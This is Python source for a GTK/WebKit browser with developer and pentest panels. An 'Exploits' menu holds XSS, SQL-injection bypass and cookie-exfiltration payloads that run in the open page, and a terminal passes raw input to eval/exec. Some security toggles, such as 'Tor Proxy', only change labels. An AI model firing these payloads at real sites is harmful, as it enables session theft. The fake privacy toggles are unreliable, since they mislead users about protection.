import sys
import gi
import os
import json
from datetime import datetime
gi.require_version('Gtk', '3.0')
gi.require_version('WebKit2', '4.1')
from gi.repository import Gtk, Gdk, GLib, Pango
from gi.repository import WebKit2

class ZeroDevBrowser(Gtk.Window):
    def __init__(self):
        super().__init__(title="Zero Browser")
        self.set_default_size(1200, 800)
        
        screen = self.get_screen()
        visual = screen.get_rgba_visual()
        if visual and screen.is_composited():
            self.set_visual(visual)
            self.set_app_paintable(True)

        self.setup_css()
        
        # State
        self.history_store = Gtk.ListStore(str, str) # Time, URL
        self.downloads_store = Gtk.ListStore(str, str, str) # Filename, Status, Progress
        self.custom_headers = []
        
        self.main_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        self.main_vbox.get_style_context().add_class("glass-container")
        self.add(self.main_vbox)
        
        # ================= HEADER BAR =================
        self.header = Gtk.HeaderBar()
        self.header.set_show_close_button(True)
        self.header.get_style_context().add_class("sleek-header")
        self.set_titlebar(self.header)

        # Left controls
        self.btn_menu = Gtk.MenuButton()
        self.main_popover = self.build_main_popover()
        self.btn_menu.set_popover(self.main_popover)
        icon_menu = Gtk.Image.new_from_icon_name("open-menu-symbolic", Gtk.IconSize.MENU)
        self.btn_menu.add(icon_menu)
        self.btn_menu.get_style_context().add_class("icon-btn")
        self.header.pack_start(self.btn_menu)

        btn_back = Gtk.Button()
        btn_back.add(Gtk.Image.new_from_icon_name("go-previous-symbolic", Gtk.IconSize.MENU))
        btn_forward = Gtk.Button()
        btn_forward.add(Gtk.Image.new_from_icon_name("go-next-symbolic", Gtk.IconSize.MENU))
        btn_back.connect("clicked", lambda b: self.current_webview.go_back() if hasattr(self, 'current_webview') else None)
        btn_forward.connect("clicked", lambda b: self.current_webview.go_forward() if hasattr(self, 'current_webview') else None)
        
        for b in (btn_back, btn_forward):
            b.get_style_context().add_class("icon-btn")
            self.header.pack_start(b)

        # Center Pill URL Bar
        self.url_bar = Gtk.Entry()
        self.url_bar.get_style_context().add_class("pill-url")
        self.url_bar.set_placeholder_text("Search or enter website name")
        self.url_bar.set_width_chars(50)
        self.url_bar.connect("activate", self.on_url_activate)
        
        self.url_bar.set_icon_from_icon_name(Gtk.EntryIconPosition.PRIMARY, "changes-prevent-symbolic")
        self.url_bar.set_icon_from_icon_name(Gtk.EntryIconPosition.SECONDARY, "view-refresh-symbolic")
        self.url_bar.connect("icon-press", self.on_url_icon_press)
        
        self.header.set_custom_title(self.url_bar)

        # Right side: Dev Tools Dropdown
        self.btn_dev = Gtk.MenuButton()
        icon_dev = Gtk.Image.new_from_icon_name("preferences-system-symbolic", Gtk.IconSize.MENU)
        self.btn_dev.add(icon_dev)
        self.btn_dev.get_style_context().add_class("icon-btn")
        self.dev_popover = self.build_dev_popover()
        self.btn_dev.set_popover(self.dev_popover)
        self.header.pack_end(self.btn_dev)

        self.btn_newtab = Gtk.Button()
        self.btn_newtab.add(Gtk.Image.new_from_icon_name("tab-new-symbolic", Gtk.IconSize.MENU))
        self.btn_newtab.get_style_context().add_class("icon-btn")
        self.btn_newtab.connect("clicked", lambda b: self.new_tab("https://google.com"))
        self.header.pack_end(self.btn_newtab)

        # ================= MAIN WORKSPACE =================
        self.vpaned = Gtk.Paned(orientation=Gtk.Orientation.VERTICAL)
        self.main_vbox.pack_start(self.vpaned, True, True, 0)
        
        self.notebook = Gtk.Notebook()
        self.notebook.get_style_context().add_class("glass-tabs")
        self.notebook.set_show_border(False)
        self.vpaned.pack1(self.notebook, True, False)
        
        self.bottom_stack = Gtk.Stack()
        self.bottom_stack.set_transition_type(Gtk.StackTransitionType.SLIDE_UP_DOWN)
        self.vpaned.pack2(self.bottom_stack, False, False)
        
        # Build Dev Tools panels
        self.inspector_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        lbl = Gtk.Label(label="Native WebInspector open externally.")
        lbl.get_style_context().add_class("tab-label")
        self.inspector_box.pack_start(lbl, False, False, 10)
        self.bottom_stack.add_named(self.inspector_box, "inspector")
        
        self.cookie_box = self.build_cookie_explorer()
        self.bottom_stack.add_named(self.cookie_box, "cookies")
        self.storage_box = self.build_storage_explorer()
        self.bottom_stack.add_named(self.storage_box, "storage")
        self.terminal_box = self.build_terminal_emulator()
        self.bottom_stack.add_named(self.terminal_box, "terminal")
        self.headers_box = self.build_headers_panel()
        self.bottom_stack.add_named(self.headers_box, "headers")
        self.css_box = self.build_css_panel()
        self.bottom_stack.add_named(self.css_box, "css")
        self.source_box = self.build_source_viewer()
        self.bottom_stack.add_named(self.source_box, "source")
        self.network_box = self.build_network_panel()
        self.bottom_stack.add_named(self.network_box, "network")
        self.js_console_box = self.build_js_console()
        self.bottom_stack.add_named(self.js_console_box, "js_console")
        
        self.bottom_stack.hide()
        
        # Global WebKit Context for Downloads
        self.web_ctx = WebKit2.WebContext.new_ephemeral()
        self.web_ctx.connect("download-started", self.on_download_started)
        
        self.new_tab("https://github.com")

    def on_url_icon_press(self, entry, icon_pos, event):
        if icon_pos == Gtk.EntryIconPosition.SECONDARY:
            if hasattr(self, 'current_webview'):
                self.current_webview.reload()

    def build_main_popover(self):
        popover = Gtk.Popover()
        popover.get_style_context().add_class("glass-popover")
        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=5)
        vbox.set_margin_top(8)
        vbox.set_margin_bottom(8)
        vbox.set_margin_start(8)
        vbox.set_margin_end(8)
        vbox.set_size_request(280, 300)
        
        # 1. Quick Links (Horizontal circular buttons)
        quick = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=8)
        quick.set_halign(Gtk.Align.CENTER)
        
        def make_quick_btn(label, url):
            b = Gtk.Button(label=label)
            b.get_style_context().add_class("quick-btn")
            b.connect("clicked", lambda x: self.new_tab(url))
            return b
            
        quick.pack_start(make_quick_btn("G", "https://google.com"), False, False, 0)
        quick.pack_start(make_quick_btn("X", "https://x.com"), False, False, 0)
        quick.pack_start(make_quick_btn("YT", "https://youtube.com"), False, False, 0)
        quick.pack_start(make_quick_btn("GH", "https://github.com"), False, False, 0)
        vbox.pack_start(quick, False, False, 5)
        
        # 2. Notebook for History / Downloads / Payloads
        nb = Gtk.Notebook()
        nb.get_style_context().add_class("popover-notebook")
        
        # History
        hist_tree = Gtk.TreeView(model=self.history_store)
        hist_tree.get_style_context().add_class("transparent-tree")
        renderer = Gtk.CellRendererText()
        hist_tree.append_column(Gtk.TreeViewColumn("Time", renderer, text=0))
        hist_tree.append_column(Gtk.TreeViewColumn("URL", renderer, text=1))
        hist_scroll = Gtk.ScrolledWindow(); hist_scroll.add(hist_tree)
        lbl_h = Gtk.Label(label="History"); lbl_h.get_style_context().add_class("popover-tab-label")
        nb.append_page(hist_scroll, lbl_h)
        hist_tree.connect("row-activated", self.on_history_activated)
        
        # Downloads
        dl_tree = Gtk.TreeView(model=self.downloads_store)
        dl_tree.get_style_context().add_class("transparent-tree")
        r2 = Gtk.CellRendererText()
        dl_tree.append_column(Gtk.TreeViewColumn("File", r2, text=0))
        dl_tree.append_column(Gtk.TreeViewColumn("Prog", r2, text=2))
        dl_scroll = Gtk.ScrolledWindow(); dl_scroll.add(dl_tree)
        lbl_d = Gtk.Label(label="Downloads"); lbl_d.get_style_context().add_class("popover-tab-label")
        nb.append_page(dl_scroll, lbl_d)
        
        # Payloads
        payload_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        plist = Gtk.ListBox()
        plist.get_style_context().add_class("transparent-list")
        payloads = [
            ("XSS Alert", "javascript:alert(1)"),
            ("SQLi Auth Bypass", "' OR '1'='1"),
            ("DOM Tree Trigger", "javascript:alert(document.documentElement.innerHTML)"),
            ("Cookie Stealer", "javascript:fetch('http://localhost/?c='+document.cookie)")
        ]
        for title, p in payloads:
            row = Gtk.ListBoxRow(); v = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
            lt = Gtk.Label(label=title); lt.set_halign(Gtk.Align.START); lt.get_style_context().add_class("payload-title")
            lp = Gtk.Label(label=p); lp.set_halign(Gtk.Align.START); lp.get_style_context().add_class("payload-text")
            lp.set_line_wrap(True)
            v.pack_start(lt, False, False, 2); v.pack_start(lp, False, False, 2); row.add(v); plist.add(row)
        plist.connect("row-activated", self.on_payload_activated)
        pscroll = Gtk.ScrolledWindow(); pscroll.add(plist)
        payload_box.pack_start(pscroll, True, True, 0)
        lbl_p = Gtk.Label(label="Exploits"); lbl_p.get_style_context().add_class("popover-tab-label")
        nb.append_page(payload_box, lbl_p)
        
        vbox.pack_start(nb, True, True, 0)
        
        popover.add(vbox)
        popover.show_all()
        return popover

    def build_dev_popover(self):
        popover = Gtk.Popover()
        popover.get_style_context().add_class("glass-popover")
        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=5)
        vbox.set_margin_top(10)
        vbox.set_margin_bottom(10)
        vbox.set_margin_start(10)
        vbox.set_margin_end(10)
        
        lbl = Gtk.Label(label="DEVELOPER STUDIO"); lbl.get_style_context().add_class("popover-title")
        vbox.pack_start(lbl, False, False, 2)
        
        # Grid of dev toggles
        grid = Gtk.Grid(column_spacing=5, row_spacing=5)
        
        dev_tools = [
            ("🔍 Inspect", "inspector"),
            ("🍪 Cookies", "cookies"),
            ("💾 Storage", "storage"),
            ("📑 Headers", "headers"),
            ("🎨 CSS", "css"),
            ("📄 Source", "source"),
            ("🌐 Network", "network"),
            ("⚡ JS", "js_console"),
            (">_ Term", "terminal")
        ]
        
        self.dev_buttons = {}
        for i, (text, key) in enumerate(dev_tools):
            b = Gtk.ToggleButton(label=text)
            b.get_style_context().add_class("dev-tool-btn")
            b.connect("toggled", lambda btn, k=key: self._toggle_panel(btn, k))
            grid.attach(b, i % 3, i // 3, 1, 1)
            self.dev_buttons[key] = b
            
        vbox.pack_start(grid, False, False, 5)
        
        # Security toggles
        sec_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=2)
        self.btn_proxy = Gtk.ToggleButton(label="🛡️ Tor Proxy: OFF")
        self.btn_proxy.connect("toggled", self.on_proxy_toggled)
        self.btn_webrtc = Gtk.ToggleButton(label="WebRTC: Leak")
        self.btn_webrtc.connect("toggled", self.on_webrtc_toggled)
        self.btn_cors = Gtk.ToggleButton(label="CORS: Strict")
        self.btn_cors.connect("toggled", self.on_cors_toggled)
        
        for b in (self.btn_proxy, self.btn_webrtc, self.btn_cors):
            b.get_style_context().add_class("dev-tool-btn")
            sec_box.pack_start(b, False, False, 0)
        
        vbox.pack_start(sec_box, False, False, 5)
        
        btn_tech = Gtk.Button(label="🤖 Detect Stack")
        btn_tech.get_style_context().add_class("dev-tool-btn")
        btn_tech.connect("clicked", self.on_tech_detect)
        vbox.pack_start(btn_tech, False, False, 0)
        
        popover.add(vbox)
        popover.show_all()
        return popover

    def _hide_all_stacks(self):
        for key, b in self.dev_buttons.items(): b.set_active(False)
        self.bottom_stack.hide()

    def _toggle_panel(self, btn, name):
        if btn.get_active():
            self._hide_all_stacks()
            btn.set_active(True)
            if name == "cookies": self.refresh_cookies()
            elif name == "storage": self.refresh_storage()
            elif name == "source": self.on_fetch_source(None)
            elif name == "inspector":
                if hasattr(self, 'current_webview'): self.current_webview.get_inspector().show()
            self.bottom_stack.show()
            self.bottom_stack.set_visible_child_name(name)
            self.dev_popover.popdown()
        else: 
            if name == "inspector" and hasattr(self, 'current_webview'):
                self.current_webview.get_inspector().close()
            self.bottom_stack.hide()

    def on_history_activated(self, treeview, path, column):
        url = self.history_store[path][1]
        self.url_bar.set_text(url)
        self.on_url_activate(self.url_bar)
        self.main_popover.popdown()
        
    def on_payload_activated(self, listbox, row):
        vbox = row.get_child()
        payload = vbox.get_children()[1].get_text()
        url = self.url_bar.get_text()
        if payload.startswith("javascript:"):
            if hasattr(self, 'current_webview'):
                self.current_webview.run_javascript(payload[11:], None, None, None)
        else:
            self.url_bar.set_text(url + payload)
            self.url_bar.grab_focus()
        self.main_popover.popdown()

    def on_download_started(self, context, download):
        req = download.get_request()
        filename = req.get_uri().split("/")[-1]
        if not filename: filename = "downloaded_file"
        dest_path = os.path.join(os.path.expanduser("~"), "Downloads", filename)
        download.set_destination("file://" + dest_path)
        iter_ref = self.downloads_store.append([filename, "Downloading...", "0%"])
        
        def on_received_data(dl, length, i=iter_ref):
            prog = int(dl.get_estimated_progress() * 100)
            self.downloads_store[i][2] = f"{prog}%"
        def on_finished(dl, i=iter_ref):
            self.downloads_store[i][1] = "Finished"
            self.downloads_store[i][2] = "100%"
        def on_failed(dl, error, i=iter_ref):
            self.downloads_store[i][1] = "Failed"
            
        download.connect("received-data", on_received_data)
        download.connect("finished", on_finished)
        download.connect("failed", on_failed)

    # ================= BOTTOM PANELS =================
    def build_terminal_emulator(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
        box.get_style_context().add_class("tool-box")
        lbl = Gtk.Label(label="PYTHON TERMINAL"); lbl.get_style_context().add_class("tool-title")
        box.pack_start(lbl, False, False, 2)
        self.term_output = Gtk.TextView(); self.term_output.get_style_context().add_class("term-text")
        scroll = Gtk.ScrolledWindow(); scroll.add(self.term_output)
        box.pack_start(scroll, True, True, 2)
        entry = Gtk.Entry(); entry.get_style_context().add_class("term-entry"); entry.connect("activate", self.on_term_execute)
        box.pack_start(entry, False, False, 2)
        return box

    def build_headers_panel(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.get_style_context().add_class("tool-box")
        lbl = Gtk.Label(label="HTTP HEADERS INJECTOR"); lbl.get_style_context().add_class("tool-title"); box.pack_start(lbl, False, False, 2)
        controls = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        self.h_key = Gtk.Entry(); self.h_key.set_placeholder_text("Key"); self.h_key.get_style_context().add_class("term-entry")
        self.h_val = Gtk.Entry(); self.h_val.set_placeholder_text("Value"); self.h_val.get_style_context().add_class("term-entry")
        btn_add = Gtk.Button(label="+ Inject"); btn_add.get_style_context().add_class("glass-btn-success"); btn_add.connect("clicked", self.on_add_header)
        controls.pack_start(self.h_key, True, True, 0); controls.pack_start(self.h_val, True, True, 0); controls.pack_start(btn_add, False, False, 0)
        box.pack_start(controls, False, False, 2)
        self.header_list = Gtk.ListBox(); self.header_list.get_style_context().add_class("glass-list")
        scroll = Gtk.ScrolledWindow(); scroll.add(self.header_list); box.pack_start(scroll, True, True, 0)
        return box

    def build_css_panel(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.get_style_context().add_class("tool-box")
        lbl = Gtk.Label(label="LIVE CSS INJECTOR"); lbl.get_style_context().add_class("tool-title"); box.pack_start(lbl, False, False, 2)
        self.css_text = Gtk.TextView(); self.css_text.get_style_context().add_class("term-text")
        scroll = Gtk.ScrolledWindow(); scroll.add(self.css_text); box.pack_start(scroll, True, True, 2)
        btn_inject = Gtk.Button(label="[💉 INJECT CSS TO CURRENT TAB]"); btn_inject.get_style_context().add_class("glass-btn-success"); btn_inject.connect("clicked", self.on_inject_css)
        box.pack_start(btn_inject, False, False, 2)
        return box

    def build_source_viewer(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.get_style_context().add_class("tool-box")
        lbl = Gtk.Label(label="PAGE SOURCE VIEWER"); lbl.get_style_context().add_class("tool-title"); box.pack_start(lbl, False, False, 2)
        self.source_text = Gtk.TextView(); self.source_text.get_style_context().add_class("term-text")
        scroll = Gtk.ScrolledWindow(); scroll.add(self.source_text); box.pack_start(scroll, True, True, 2)
        btn_refresh = Gtk.Button(label="[⟳ Fetch Latest DOM Source]"); btn_refresh.get_style_context().add_class("glass-btn-success"); btn_refresh.connect("clicked", self.on_fetch_source)
        box.pack_start(btn_refresh, False, False, 2)
        return box

    def build_cookie_explorer(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.get_style_context().add_class("tool-box")
        hdr = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        lbl = Gtk.Label(label="SITE COOKIES"); lbl.get_style_context().add_class("tool-title")
        btn = Gtk.Button(label="Refresh"); btn.get_style_context().add_class("glass-btn"); btn.connect("clicked", self.refresh_cookies)
        hdr.pack_start(lbl, False, False, 2); hdr.pack_end(btn, False, False, 2); box.pack_start(hdr, False, False, 2)
        self.cookie_list = Gtk.ListBox(); self.cookie_list.get_style_context().add_class("glass-list")
        scroll = Gtk.ScrolledWindow(); scroll.add(self.cookie_list); box.pack_start(scroll, True, True, 0)
        return box

    def build_storage_explorer(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.get_style_context().add_class("tool-box")
        hdr = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        lbl = Gtk.Label(label="LOCAL STORAGE"); lbl.get_style_context().add_class("tool-title")
        btn = Gtk.Button(label="Refresh"); btn.get_style_context().add_class("glass-btn"); btn.connect("clicked", self.refresh_storage)
        hdr.pack_start(lbl, False, False, 2); hdr.pack_end(btn, False, False, 2); box.pack_start(hdr, False, False, 2)
        controls = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        self.ls_key = Gtk.Entry(); self.ls_key.get_style_context().add_class("term-entry")
        self.ls_val = Gtk.Entry(); self.ls_val.get_style_context().add_class("term-entry")
        btn_add = Gtk.Button(label="+ Set Item"); btn_add.get_style_context().add_class("glass-btn-success"); btn_add.connect("clicked", self.on_add_storage)
        controls.pack_start(self.ls_key, True, True, 0); controls.pack_start(self.ls_val, True, True, 0); controls.pack_start(btn_add, False, False, 0)
        box.pack_start(controls, False, False, 2)
        self.storage_list = Gtk.ListBox(); self.storage_list.get_style_context().add_class("glass-list")
        scroll = Gtk.ScrolledWindow(); scroll.add(self.storage_list); box.pack_start(scroll, True, True, 0)
        return box

    def build_network_panel(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.get_style_context().add_class("tool-box")
        hdr = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
        lbl = Gtk.Label(label="NETWORK LOGGER"); lbl.get_style_context().add_class("tool-title")
        btn = Gtk.Button(label="Clear Logs"); btn.get_style_context().add_class("glass-btn-danger"); btn.connect("clicked", self.on_clear_network)
        hdr.pack_start(lbl, False, False, 2); hdr.pack_end(btn, False, False, 2); box.pack_start(hdr, False, False, 2)
        self.network_list = Gtk.ListBox(); self.network_list.get_style_context().add_class("glass-list")
        scroll = Gtk.ScrolledWindow(); scroll.add(self.network_list); box.pack_start(scroll, True, True, 0)
        return box

    def build_js_console(self):
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.get_style_context().add_class("tool-box")
        lbl = Gtk.Label(label="JS CONSOLE"); lbl.get_style_context().add_class("tool-title"); box.pack_start(lbl, False, False, 2)
        self.js_output = Gtk.TextView(); self.js_output.get_style_context().add_class("term-text"); self.js_output.set_editable(False)
        self.js_output.get_buffer().set_text("> ")
        scroll = Gtk.ScrolledWindow(); scroll.add(self.js_output); box.pack_start(scroll, True, True, 2)
        entry = Gtk.Entry(); entry.get_style_context().add_class("term-entry"); entry.connect("activate", self.on_js_execute)
        box.pack_start(entry, False, False, 0)
        return box

    # --- ACTION HANDLERS ---
    def on_js_execute(self, entry):
        if not hasattr(self, 'current_webview'): return
        js_cmd = entry.get_text()
        buf = self.js_output.get_buffer(); buf.insert(buf.get_end_iter(), js_cmd + "\n"); entry.set_text("")
        def on_js_finish(w, r, u):
            try:
                val = w.run_javascript_finish(r).get_js_value()
                out = val.to_string() if val.is_string() else str(val.to_double()) if val.is_number() else str(val.to_boolean()) if val.is_boolean() else "null" if val.is_null() else "undefined" if val.is_undefined() else "[Object]"
                buf.insert(buf.get_end_iter(), "<- " + out + "\n> ")
            except Exception as e: buf.insert(buf.get_end_iter(), f"Error: {e}\n> ")
        self.current_webview.run_javascript(js_cmd, None, on_js_finish, None)

    def on_tech_detect(self, btn):
        if not hasattr(self, 'current_webview'): return
        js = "var t=[]; if(window.React) t.push('React'); if(window.Vue) t.push('Vue'); if(window.jQuery) t.push('jQuery'); return t.join(',');"
        def on_js_finish(w, r, u):
            try:
                res = w.run_javascript_finish(r).get_js_value().to_string()
                d = Gtk.MessageDialog(self, 0, Gtk.MessageType.INFO, Gtk.ButtonsType.OK, "Tech Stack:")
                d.format_secondary_text(res or "None"); d.run(); d.destroy()
            except: pass
        self.current_webview.run_javascript(js, None, on_js_finish, None)

    def on_webrtc_toggled(self, btn):
        if not hasattr(self, 'current_webview'): return
        settings = self.current_webview.get_settings()
        if btn.get_active():
            btn.set_label("WebRTC: Blocked")
            settings.set_enable_webrtc(False)
        else:
            btn.set_label("WebRTC: Leak")
            settings.set_enable_webrtc(True)
        self.current_webview.set_settings(settings)

    def on_cors_toggled(self, btn):
        if not hasattr(self, 'current_webview'): return
        settings = self.current_webview.get_settings()
        if btn.get_active():
            btn.set_label("CORS: Bypass")
            settings.set_enable_xss_auditor(False)
        else:
            btn.set_label("CORS: Strict")
            settings.set_enable_xss_auditor(True)
        self.current_webview.set_settings(settings)

    def on_clear_network(self, btn):
        for child in self.network_list.get_children(): self.network_list.remove(child)

    def on_resource_load(self, webview, resource, request):
        uri = request.get_uri()
        method = request.get_http_method() or "GET" if hasattr(request, 'get_http_method') else "GET"
        row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        lm = Gtk.Label(label=f"[{method}]"); lm.get_style_context().add_class("cookie-key")
        lu = Gtk.Label(label=uri); lu.get_style_context().add_class("cookie-val"); lu.set_halign(Gtk.Align.START)
        hbox.pack_start(lm, False, False, 0); hbox.pack_start(lu, True, True, 0); row.add(hbox)
        self.network_list.add(row); self.network_list.show_all()

    def refresh_cookies(self, btn=None):
        if not hasattr(self, 'current_webview'): return
        for child in self.cookie_list.get_children(): self.cookie_list.remove(child)
        def on_js_finish(w, r, u):
            try:
                for c in w.run_javascript_finish(r).get_js_value().to_string().split(";"):
                    if "=" not in c: continue
                    k, v = c.split("=", 1)
                    row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
                    lk = Gtk.Label(label=k.strip()); lk.get_style_context().add_class("cookie-key"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START)
                    lv = Gtk.Label(label=v.strip()); lv.get_style_context().add_class("cookie-val"); lv.set_halign(Gtk.Align.START)
                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox)
                    self.cookie_list.add(row)
                self.cookie_list.show_all()
            except: pass
        self.current_webview.run_javascript("document.cookie", None, on_js_finish, None)

    def refresh_storage(self, btn=None):
        if not hasattr(self, 'current_webview'): return
        for child in self.storage_list.get_children(): self.storage_list.remove(child)
        def on_js_finish(w, r, u):
            try:
                for k, v in json.loads(w.run_javascript_finish(r).get_js_value().to_string()).items():
                    row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
                    lk = Gtk.Label(label=k); lk.get_style_context().add_class("cookie-key"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START)
                    lv = Gtk.Label(label=str(v)); lv.get_style_context().add_class("cookie-val"); lv.set_halign(Gtk.Align.START)
                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox)
                    self.storage_list.add(row)
                self.storage_list.show_all()
            except: pass
        self.current_webview.run_javascript("JSON.stringify(localStorage);", None, on_js_finish, None)

    def on_add_storage(self, btn):
        k, v = self.ls_key.get_text().strip(), self.ls_val.get_text().strip()
        if k and v:
            self.current_webview.run_javascript(f"localStorage.setItem('{k}', '{v}');", None, None, None)
            self.ls_key.set_text(""); self.ls_val.set_text(""); self.refresh_storage()

    def on_fetch_source(self, btn):
        if not hasattr(self, 'current_webview'): return
        def on_js_finish(w, r, u):
            try: self.source_text.get_buffer().set_text(w.run_javascript_finish(r).get_js_value().to_string())
            except: pass
        self.current_webview.run_javascript("document.documentElement.outerHTML", None, on_js_finish, None)

    def on_inject_css(self, btn):
        buf = self.css_text.get_buffer()
        css = buf.get_text(buf.get_start_iter(), buf.get_end_iter(), True).replace("`", "\\`")
        self.current_webview.run_javascript(f"var s = document.createElement('style'); s.innerHTML = `{css}`; document.head.appendChild(s);", None, None, None)

    def on_add_header(self, btn):
        k, v = self.h_key.get_text().strip(), self.h_val.get_text().strip()
        if k and v:
            self.custom_headers.append((k, v))
            row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL)
            lk = Gtk.Label(label=k); lk.get_style_context().add_class("cookie-key"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START)
            lv = Gtk.Label(label=v); lv.get_style_context().add_class("cookie-val"); lv.set_halign(Gtk.Align.START)
            hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox)
            self.header_list.add(row); self.header_list.show_all()
            self.h_key.set_text(""); self.h_val.set_text("")

    def on_term_execute(self, entry):
        cmd = entry.get_text()
        buf = self.term_output.get_buffer(); buf.insert(buf.get_end_iter(), cmd + "\n")
        try: buf.insert(buf.get_end_iter(), str(eval(cmd)) + "\n>>> ")
        except Exception as e:
            try: exec(cmd); buf.insert(buf.get_end_iter(), "Executed.\n>>> ")
            except Exception as ex: buf.insert(buf.get_end_iter(), f"Error: {ex}\n>>> ")
        entry.set_text("")

    def new_tab(self, url):
        webview = WebKit2.WebView.new_with_context(self.web_ctx)
        webview.connect("resource-load-started", self.on_resource_load)
        
        settings = webview.get_settings()
        settings.set_enable_developer_extras(True)
        webview.set_settings(settings)
        
        webview.load_uri(url)
        scrolled = Gtk.ScrolledWindow(); scrolled.add(webview)
        
        hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        label = Gtk.Label(label="New Tab")
        label.get_style_context().add_class("tab-label-bold")
        btn_close = Gtk.Button()
        btn_close.add(Gtk.Image.new_from_icon_name("window-close-symbolic", Gtk.IconSize.MENU))
        btn_close.get_style_context().add_class("close-btn")
        btn_close.connect("clicked", lambda b: self.notebook.remove_page(self.notebook.page_num(scrolled)))
        hbox.pack_start(label, True, True, 0)
        hbox.pack_end(btn_close, False, False, 0)
        hbox.show_all()
        
        self.notebook.append_page(scrolled, hbox)
        self.notebook.show_all()
        
        def on_uri(w, p):
            uri = w.get_uri() or ""
            self.url_bar.set_text(uri)
            time_str = datetime.now().strftime("%H:%M")
            self.history_store.append([time_str, uri])
            
        webview.connect("notify::uri", on_uri)
        webview.connect("notify::title", lambda w, p: label.set_text(w.get_title() or "Untitled"))
        self.current_webview = webview

    def on_url_activate(self, entry):
        url = entry.get_text()
        if not url.startswith("http"): url = "https://" + url
        if hasattr(self, 'current_webview'): self.current_webview.load_uri(url)

    def on_proxy_toggled(self, btn):
        if btn.get_active():
            btn.set_label("🛡️ Proxy: TOR")
        else:
            btn.set_label("🛡️ Proxy: OFF")

    def setup_css(self):
        css = b'''
            window { background-color: #12141a; }
            .sleek-header { 
                background: rgba(18, 20, 26, 0.95); 
                border-bottom: 1px solid rgba(255, 255, 255, 0.05); 
                box-shadow: none;
                padding: 0px 4px;
            }
            .pill-url { 
                background: rgba(255, 255, 255, 0.05); 
                color: #FFFFFF; 
                border: 1px solid rgba(255, 255, 255, 0.1); 
                border-radius: 20px; 
                padding: 4px 12px; 
                font-family: sans-serif; 
                font-size: 11px; 
                min-height: 28px;
                box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
            }
            .pill-url:focus { 
                border: 1px solid #4D90FE; 
                box-shadow: 0 0 10px rgba(77, 144, 254, 0.3), inset 0 2px 4px rgba(0,0,0,0.2); 
            }
            .icon-btn { 
                background: transparent;
                color: #A0AAB5; 
                border: none; 
                border-radius: 50%; 
                padding: 4px; 
                transition: all 0.2s;
            }
            .icon-btn:hover { background: rgba(255, 255, 255, 0.1); color: #FFF; }
            
            /* Popover Styling (Arc Style) */
            .glass-popover {
                background: rgba(30, 34, 40, 0.98);
                border: 1px solid rgba(255,255,255,0.1);
                border-radius: 12px;
                box-shadow: 0 8px 24px rgba(0,0,0,0.6);
                padding: 4px;
            }
            .quick-btn {
                background: rgba(255,255,255,0.05);
                color: #FFF;
                border: 1px solid rgba(255,255,255,0.1);
                border-radius: 50%;
                font-weight: bold;
                padding: 6px;
                min-width: 32px; min-height: 32px;
                font-size: 10px;
            }
            .quick-btn:hover { background: rgba(77,144,254,0.3); border-color: #4D90FE; }
            
            .popover-notebook header { background: transparent; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 2px;}
            .popover-tab-label { color: #A0AAB5; font-size: 11px; font-weight: bold; padding: 2px; }
            .transparent-tree, .transparent-list { background: transparent; color: #FFF; font-size: 11px;}
            treeview header button { background: transparent; color: #A0AAB5; border: none; font-size: 10px; padding: 2px;}
            
            .payload-title { color: #4D90FE; font-size: 11px; font-weight: bold; }
            .payload-text { color: #8090A0; font-size: 9px; font-family: monospace; }
            
            /* Dev Tools */
            .dev-tool-btn {
                background: rgba(255,255,255,0.05);
                color: #A0AAB5;
                border: 1px solid rgba(255,255,255,0.1);
                border-radius: 6px;
                padding: 4px;
                font-weight: bold;
                font-size: 10px;
            }
            .dev-tool-btn:hover { background: rgba(255,255,255,0.1); color: #FFF; }
            .dev-tool-btn:checked { background: rgba(77,144,254,0.2); border: 1px solid #4D90FE; color: #4D90FE; }
            .popover-title { color: #FFF; font-weight: bold; font-size: 11px; letter-spacing: 1px; margin-bottom: 4px;}
            
            /* Bottom Drawers */
            .tool-box { background: #1E2228; border-top: 1px solid rgba(255,255,255,0.1); padding: 4px;}
            .tool-title { color: #4D90FE; font-weight: bold; font-size: 11px; letter-spacing: 1px; }
            .term-text { background: transparent; color: #4D90FE; font-family: monospace; font-size: 11px;}
